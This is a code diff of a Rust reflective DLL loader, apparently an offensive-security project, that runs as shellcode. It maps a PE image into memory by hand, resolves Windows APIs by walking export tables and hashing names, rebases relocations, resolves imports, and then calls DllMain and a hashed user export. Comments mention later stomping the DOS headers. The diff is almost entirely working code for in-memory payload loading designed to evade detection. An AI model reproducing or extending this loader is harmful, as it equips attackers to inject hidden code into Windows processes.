@@ -95,7 +95,7 @@ pub extern "system" fn reflective_loader(image_bytes: *mut c_void, user_function
     }
 
     //
-    // Step 2) Allocate memory and copy sections into the newly allocated memory
+    // Step 2) Allocate memory and copy sections and headers into the newly allocated memory
     //
     
     let new_module_base = unsafe { copy_sections_to_local_process(module_base) };
@@ -104,17 +104,19 @@ pub extern "system" fn reflective_loader(image_bytes: *mut c_void, user_function
         return;
     }
 
+    unsafe { copy_headers(module_base as _, new_module_base) }; //copy headers (remember to stomp dos headers later)
+
     //
     // Step 3) Process image relocations (rebase image)
     //
 
-    unsafe { rebase_image(module_base as _, new_module_base) };
+    unsafe { rebase_image(new_module_base) };
 
     //
     // Step 4) Process image import table (resolve imports)
     //
 
-    unsafe { resolve_imports(module_base as _, new_module_base) };
+    unsafe { resolve_imports(new_module_base) };
 
 
     //
@@ -170,40 +172,33 @@ pub extern "system" fn reflective_loader(image_bytes: *mut c_void, user_function
         unsafe { VIRTUAL_PROTECT.unwrap()(destination as _, size, _protection, &mut _old_protection) };
     }
 
-    //
-    // 6) Execute DllMain AND USER_FUNCTION
-    //
-
-    let entry_point = unsafe { new_module_base as usize + (*nt_headers).OptionalHeader.AddressOfEntryPoint as usize };
-
     // We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.
     unsafe { FLUSH_INSTRUCTION_CACHE.unwrap()(-1 as _, std::ptr::null_mut(), 0) };
 
+    //
+    // 6) Execute DllMain AND USER_FUNCTION
+    //
+    let entry_point = unsafe { new_module_base as usize + (*nt_headers).OptionalHeader.AddressOfEntryPoint as usize };
     
     #[allow(non_snake_case)]
     let DllMain = unsafe { std::mem::transmute::<_, fnDllMain>(entry_point) };
 
     unsafe { DllMain(new_module_base as _, DLL_PROCESS_ATTACH, module_base as _) };
 
-    // Make sure to add the arguments the reflective_loader and call the reflective loader. (TODO)
-    //let user_function = unsafe { get_module_exports_by_hash(new_module_base as _, user_function_hash) };
-    //unsafe { USER_FUNCTION = Some(std::mem::transmute::<_, fnUserFunction>(user_function)) };
 
+
+    // Get USER_FUNCTION export by hash
+    let user_function_address = unsafe { get_export_by_hash(new_module_base as _, user_function_hash) };
+
+    // Make sure to add the arguments the reflective_loader and call the reflective loader. (TODO)
+    unsafe { USER_FUNCTION = Some(std::mem::transmute::<_, fnUserFunction>(user_function_address)) };
+    
     // Calling user function
-    //unsafe { USER_FUNCTION.unwrap()(user_data, user_data_length) };
+    unsafe { USER_FUNCTION.unwrap()(user_data, user_data_length) };
+
 
     //Since we have resolved imports, we can call these normally (testing VirtualFree for now, will do exit thread later)
     
-    /*  for debugging
-    unsafe { 
-        asm!("nop");
-        asm!("nop");
-        asm!("nop");
-        asm!("nop");
-        asm!("nop");
-        asm!("nop");
-    }*/
-
     // Free the bootstrap shellcode memory
     //unsafe { VIRTUAL_FREE.unwrap()(bootstrap_shellcode_address as _, 0, MEM_RELEASE) };
     // Does not work, maybe because can't free your own shellcode because memory is in use.
@@ -214,9 +209,24 @@ pub extern "system" fn reflective_loader(image_bytes: *mut c_void, user_function
 }
 
 
+/// Copy headers into the target memory location
+#[no_mangle]
+unsafe fn copy_headers(module_base: *const u8, new_module_base: *mut c_void) {
+    let dos_header = module_base as *mut IMAGE_DOS_HEADER;
+
+    #[cfg(target_arch = "x86")]
+    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS32;
+    #[cfg(target_arch = "x86_64")]
+    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
+
+    for i in 0..(*nt_headers).OptionalHeader.SizeOfHeaders {
+        new_module_base.cast::<u8>().add(i as usize).write(module_base.add(i as usize).read());
+    }
+}
+
 /// Rebase the image / perform image base relocation
 #[no_mangle]
-unsafe fn rebase_image(module_base: *mut c_void, new_module_base: *mut c_void) {
+unsafe fn rebase_image(module_base: *mut c_void) {
 
     let dos_header = module_base as *mut IMAGE_DOS_HEADER;
 
@@ -226,7 +236,7 @@ unsafe fn rebase_image(module_base: *mut c_void, new_module_base: *mut c_void) {
     let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
 
     // Calculate the difference between remote allocated memory region where the image will be loaded and preferred ImageBase (delta)
-    let delta = new_module_base as isize - (*nt_headers).OptionalHeader.ImageBase as isize;
+    let delta = module_base as isize - (*nt_headers).OptionalHeader.ImageBase as isize;
 
     // Return early if delta is 0
     if delta == 0 {
@@ -236,7 +246,7 @@ unsafe fn rebase_image(module_base: *mut c_void, new_module_base: *mut c_void) {
     // Resolve the imports of the newly allocated memory region 
 
     // Get a pointer to the first _IMAGE_BASE_RELOCATION
-    let mut base_relocation = (new_module_base as usize 
+    let mut base_relocation = (module_base as usize 
         + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize].VirtualAddress as usize) as *mut IMAGE_BASE_RELOCATION;
     
     // Get the end of _IMAGE_BASE_RELOCATION
@@ -246,7 +256,7 @@ unsafe fn rebase_image(module_base: *mut c_void, new_module_base: *mut c_void) {
     while (*base_relocation).VirtualAddress != 0u32 && (*base_relocation).VirtualAddress as usize <= base_relocation_end && (*base_relocation).SizeOfBlock != 0u32 {
         
         // Get the VirtualAddress, SizeOfBlock and entries count of the current _IMAGE_BASE_RELOCATION block
-        let address = (new_module_base as usize + (*base_relocation).VirtualAddress as usize) as isize;
+        let address = (module_base as usize + (*base_relocation).VirtualAddress as usize) as isize;
         let item = (base_relocation as usize + std::mem::size_of::<IMAGE_BASE_RELOCATION>()) as *const u16;
         let count = ((*base_relocation).SizeOfBlock as usize - std::mem::size_of::<IMAGE_BASE_RELOCATION>()) / std::mem::size_of::<u16>() as usize;
 
@@ -270,7 +280,7 @@ unsafe fn rebase_image(module_base: *mut c_void, new_module_base: *mut c_void) {
 
 /// Resolve the image imports
 #[no_mangle]
-unsafe fn resolve_imports(module_base: *mut c_void, new_module_base: *mut c_void) {
+unsafe fn resolve_imports(module_base: *mut c_void) {
     let dos_header = module_base as *mut IMAGE_DOS_HEADER;
 
     #[cfg(target_arch = "x86")]
@@ -279,37 +289,37 @@ unsafe fn resolve_imports(module_base: *mut c_void, new_module_base: *mut c_void
     let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
 
     // Get a pointer to the first _IMAGE_IMPORT_DESCRIPTOR
-    let mut import_directory = (new_module_base as usize + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT as usize].VirtualAddress as usize) as *mut IMAGE_IMPORT_DESCRIPTOR;
+    let mut import_directory = (module_base as usize + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT as usize].VirtualAddress as usize) as *mut IMAGE_IMPORT_DESCRIPTOR;
     
     while (*import_directory).Name != 0x0 {
 
         // Get the name of the dll in the current _IMAGE_IMPORT_DESCRIPTOR
-        let dll_name = (new_module_base as usize + (*import_directory).Name as usize) as *const i8;
+        let dll_name = (module_base as usize + (*import_directory).Name as usize) as *const i8;
 
         // Load the DLL in the in the address space of the process by calling the function pointer LoadLibraryA
         let dll_handle = LOAD_LIBRARY_A.unwrap()(dll_name as _);
 
         // Get a pointer to the Original Thunk or First Thunk via OriginalFirstThunk or FirstThunk 
-        let mut original_thunk = if (new_module_base as usize + (*import_directory).Anonymous.OriginalFirstThunk as usize) != 0 {
+        let mut original_thunk = if (module_base as usize + (*import_directory).Anonymous.OriginalFirstThunk as usize) != 0 {
             #[cfg(target_arch = "x86")]
-            let orig_thunk = (new_module_base as usize + (*import_directory).Anonymous.OriginalFirstThunk as usize) as *mut IMAGE_THUNK_DATA32;
+            let orig_thunk = (module_base as usize + (*import_directory).Anonymous.OriginalFirstThunk as usize) as *mut IMAGE_THUNK_DATA32;
             #[cfg(target_arch = "x86_64")]
-            let orig_thunk = (new_module_base as usize + (*import_directory).Anonymous.OriginalFirstThunk as usize) as *mut IMAGE_THUNK_DATA64;
+            let orig_thunk = (module_base as usize + (*import_directory).Anonymous.OriginalFirstThunk as usize) as *mut IMAGE_THUNK_DATA64;
 
             orig_thunk
         } else {
             #[cfg(target_arch = "x86")]
-            let thunk = (new_module_base as usize + (*import_directory).FirstThunk as usize) as *mut IMAGE_THUNK_DATA32;
+            let thunk = (module_base as usize + (*import_directory).FirstThunk as usize) as *mut IMAGE_THUNK_DATA32;
             #[cfg(target_arch = "x86_64")]
-            let thunk = (new_module_base as usize + (*import_directory).FirstThunk as usize) as *mut IMAGE_THUNK_DATA64;
+            let thunk = (module_base as usize + (*import_directory).FirstThunk as usize) as *mut IMAGE_THUNK_DATA64;
 
             thunk
         };
 
         #[cfg(target_arch = "x86")]
-        let mut thunk = (new_module_base as usize + (*import_directory).FirstThunk as usize) as *mut IMAGE_THUNK_DATA32;
+        let mut thunk = (module_base as usize + (*import_directory).FirstThunk as usize) as *mut IMAGE_THUNK_DATA32;
         #[cfg(target_arch = "x86_64")]
-        let mut thunk = (new_module_base as usize + (*import_directory).FirstThunk as usize) as *mut IMAGE_THUNK_DATA64;
+        let mut thunk = (module_base as usize + (*import_directory).FirstThunk as usize) as *mut IMAGE_THUNK_DATA64;
  
         while (*original_thunk).u1.Function != 0 {
             // #define IMAGE_SNAP_BY_ORDINAL64(Ordinal) ((Ordinal & IMAGE_ORDINAL_FLAG64) != 0) or #define IMAGE_SNAP_BY_ORDINAL32(Ordinal) ((Ordinal & IMAGE_ORDINAL_FLAG32) != 0)
@@ -326,7 +336,7 @@ unsafe fn resolve_imports(module_base: *mut c_void, new_module_base: *mut c_void
                 (*thunk).u1.Function = GET_PROC_ADDRESS.unwrap()(dll_handle, fn_ordinal).unwrap() as _; 
             } else {
                 // Get a pointer to _IMAGE_IMPORT_BY_NAME
-                let thunk_data = (new_module_base as usize + (*original_thunk).u1.AddressOfData as usize) as *mut IMAGE_IMPORT_BY_NAME;
+                let thunk_data = (module_base as usize + (*original_thunk).u1.AddressOfData as usize) as *mut IMAGE_IMPORT_BY_NAME;
 
                 // Get a pointer to the function name in the IMAGE_IMPORT_BY_NAME
                 let fn_name = (*thunk_data).Name.as_ptr();
@@ -453,28 +463,28 @@ pub fn set_exported_functions_by_name() -> bool {
     }
 
     // get exports by name and store the their virtual address
-    let loadlibrarya_address = unsafe { get_module_exports(kernel32_base, load_librarya_bytes.as_ptr()) };
+    let loadlibrarya_address = unsafe { get_export_by_name(kernel32_base, load_librarya_bytes.as_ptr()) };
     unsafe { LOAD_LIBRARY_A = Some(std::mem::transmute::<_, fnLoadLibraryA>(loadlibrarya_address)) };
 
-    let getprocaddress_address = unsafe { get_module_exports(kernel32_base, get_proc_address_bytes.as_ptr()) };
+    let getprocaddress_address = unsafe { get_export_by_name(kernel32_base, get_proc_address_bytes.as_ptr()) };
     unsafe { GET_PROC_ADDRESS = Some(std::mem::transmute::<_, fnGetProcAddress>(getprocaddress_address)) };
 
-    let virtualalloc_address = unsafe { get_module_exports(kernel32_base, virtual_alloc_bytes.as_ptr()) };
+    let virtualalloc_address = unsafe { get_export_by_name(kernel32_base, virtual_alloc_bytes.as_ptr()) };
     unsafe { VIRTUAL_ALLOC = Some(std::mem::transmute::<_, fnVirtualAlloc>(virtualalloc_address)) };
 
-    let virtualprotect_address = unsafe { get_module_exports(kernel32_base, virtual_protect_bytes.as_ptr()) };
+    let virtualprotect_address = unsafe { get_export_by_name(kernel32_base, virtual_protect_bytes.as_ptr()) };
     unsafe { VIRTUAL_PROTECT = Some(std::mem::transmute::<_, fnVirtualProtect>(virtualprotect_address)) };
 
-    let flushinstructioncache_address = unsafe { get_module_exports(kernel32_base, flush_instruction_cache_bytes.as_ptr()) };
+    let flushinstructioncache_address = unsafe { get_export_by_name(kernel32_base, flush_instruction_cache_bytes.as_ptr()) };
     unsafe { FLUSH_INSTRUCTION_CACHE = Some(std::mem::transmute::<_, fnFlushInstructionCache>(flushinstructioncache_address)) };
 
-    let flushinstructioncache_address = unsafe { get_module_exports(kernel32_base, flush_instruction_cache_bytes.as_ptr()) };
+    let flushinstructioncache_address = unsafe { get_export_by_name(kernel32_base, flush_instruction_cache_bytes.as_ptr()) };
     unsafe { FLUSH_INSTRUCTION_CACHE = Some(std::mem::transmute::<_, fnFlushInstructionCache>(flushinstructioncache_address)) };
 
-    let virtualfree_address = unsafe { get_module_exports(kernel32_base, virtual_free_bytes.as_ptr()) };
+    let virtualfree_address = unsafe { get_export_by_name(kernel32_base, virtual_free_bytes.as_ptr()) };
     unsafe { VIRTUAL_FREE = Some(std::mem::transmute::<_, fnVirtualFree>(virtualfree_address)) };
 
-    let exitthread_address = unsafe { get_module_exports(kernel32_base, exit_thread_bytes.as_ptr()) };
+    let exitthread_address = unsafe { get_export_by_name(kernel32_base, exit_thread_bytes.as_ptr()) };
     unsafe { EXIT_THREAD = Some(std::mem::transmute::<_, fnExitThread>(exitthread_address)) };
 
 
@@ -507,7 +517,7 @@ pub unsafe fn get_loaded_modules_by_name(module_name: *const u16) -> *mut u8 {
     return std::ptr::null_mut();
 }
 
-//Thanks 2vg
+//Credits: 2vg / shoya
 pub fn compare_raw_str<T>(s: *const T, u: *const T) -> bool
 where
     T: Num,
@@ -531,9 +541,9 @@ where
     }
 }
 
-/// Retrieves all function and addresses from the specfied modules
+/// Gets the address of a function by name
 #[no_mangle]
-unsafe fn get_module_exports(module_base: *mut u8, module_name: *const i8) -> usize {
+unsafe fn get_export_by_name(module_base: *mut u8, module_name: *const i8) -> usize {
 
     let dos_header = module_base as *mut IMAGE_DOS_HEADER;
 
@@ -541,10 +551,10 @@ unsafe fn get_module_exports(module_base: *mut u8, module_name: *const i8) -> us
     let nt_headers =  (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS32;
 
     #[cfg(target_arch = "x86_64")]
-    let nt_header = (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
+    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
 
     let export_directory = (module_base as usize
-        + (*nt_header).OptionalHeader.DataDirectory
+        + (*nt_headers).OptionalHeader.DataDirectory
             [IMAGE_DIRECTORY_ENTRY_EXPORT as usize]
             .VirtualAddress as usize)
         as *mut IMAGE_EXPORT_DIRECTORY;
@@ -579,20 +589,32 @@ unsafe fn get_module_exports(module_base: *mut u8, module_name: *const i8) -> us
     return 0;
 }
 
-// Thanks MaulingMonkey and chrisd :) (Rust Community Discord server #windows-dev)
-fn hash(word: &str) -> u32 {
-    const HASH_KEY: u32 = 13;
-    let mut h = 0_u32;
-    for c in word.bytes() {
-        h = h.rotate_right(HASH_KEY * 2);
-        h += c as u32;
-    }
-    h.rotate_right(HASH_KEY)
+//credits: janoglezcampos / @httpyxel / yxel
+pub const fn hash(buffer : &[u8]) -> u32
+{   
+	let mut hsh : u32   = 5381;
+    let mut iter: usize = 0;
+    let mut cur : u8; 
+
+	while iter < buffer.len()
+	{   
+        cur = buffer[iter];
+        if cur == 0 {
+            iter += 1;
+            continue;
+        }
+        if cur >= ('a' as u8) {
+			cur -= 0x20;
+        }
+		hsh = ((hsh << 5).wrapping_add(hsh)) + cur as u32;
+        iter += 1;
+	};
+	return hsh;
 }
 
-/// Retrieves all function and addresses from the specfied modules
+/// Gets the address of a function by hash
 #[no_mangle]
-unsafe fn get_module_exports_by_hash(module_base: *mut u8, module_name_hash: u32) -> usize {
+unsafe fn get_export_by_hash(module_base: *mut u8, module_name_hash: u32) -> usize {
 
     let dos_header = module_base as *mut IMAGE_DOS_HEADER;
 
@@ -600,10 +622,10 @@ unsafe fn get_module_exports_by_hash(module_base: *mut u8, module_name_hash: u32
     let nt_headers =  (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS32;
 
     #[cfg(target_arch = "x86_64")]
-    let nt_header = (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
+    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
 
     let export_directory = (module_base as usize
-        + (*nt_header).OptionalHeader.DataDirectory
+        + (*nt_headers).OptionalHeader.DataDirectory
             [IMAGE_DIRECTORY_ENTRY_EXPORT as usize]
             .VirtualAddress as usize)
         as *mut IMAGE_EXPORT_DIRECTORY;
@@ -628,15 +650,25 @@ unsafe fn get_module_exports_by_hash(module_base: *mut u8, module_name_hash: u32
 
     for i in 0..(*export_directory).NumberOfNames {
 
-        let name = (module_base as usize + names[i as usize] as usize) as *const i8;
+        let name_addr = (module_base as usize + names[i as usize] as usize) as *const i8;
+        let name_len = get_cstr_len(name_addr as _);
+        let name_slice: &[u8] = core::slice::from_raw_parts(name_addr as _, name_len);
 
-        if let Ok(name) = std::ffi::CStr::from_ptr(name).to_str() {
-            // Check the C String hash with our hash
-            if hash(name) == module_name_hash {
-                let ordinal = ordinals[i as usize] as usize;
-                return module_base as usize + functions[ordinal] as usize;
-            }
+        if module_name_hash == hash(name_slice) {
+            let ordinal = ordinals[i as usize] as usize;
+            return module_base as usize + functions[ordinal] as usize;
         }
     }  
     return 0;
+}
+
+//credits: janoglezcampos / @httpyxel / yxel
+pub fn get_cstr_len(pointer: *const char) -> usize{
+    let mut tmp: u64 = pointer as u64;
+    unsafe {
+        while *(tmp as *const u8) != 0{
+            tmp += 1;
+        }
+    }
+    (tmp - pointer as u64) as _
 }
